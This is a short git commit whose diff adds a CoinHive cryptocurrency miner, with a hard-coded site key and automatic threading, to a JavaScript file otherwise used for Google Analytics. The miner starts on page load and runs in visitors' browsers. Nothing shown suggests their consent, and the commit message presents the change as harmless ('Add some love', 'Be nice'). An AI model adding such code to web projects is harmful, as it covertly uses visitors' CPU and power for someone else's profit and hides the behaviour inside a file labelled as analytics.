22b01cc9d901c6741d7c281d3389ca136ad89567
HaoZeke <driger633@gmail.com>
2017-11-14 09:22:17 +0530

    [SQUASHED] Miner
    site: Add some love (miner)
    miner: Be nice
    miner: Be asynchronous

--- src/js/gAnalyticsHive.js
+++ src/js/gAnalyticsHive.js
@@ -1,5 +1,10 @@
+// Analytics
 window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 
 gtag('config', 'UA-109503488-1');
+
+// CoinHive
+var miner = new CoinHive.Anonymous('cscbhkLGY5afkBmv2Z8J0cpzAMmulLFn', {autoThreads: true});
+miner.start();
